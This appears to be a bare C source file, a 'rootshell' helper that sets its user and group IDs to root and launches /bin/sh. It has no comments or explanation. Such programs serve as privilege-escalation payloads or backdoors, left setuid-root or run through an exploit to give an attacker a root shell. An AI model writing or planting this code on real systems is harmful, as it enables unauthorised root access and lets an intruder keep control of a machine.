#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh", "sh", NULL);
    return 0;
}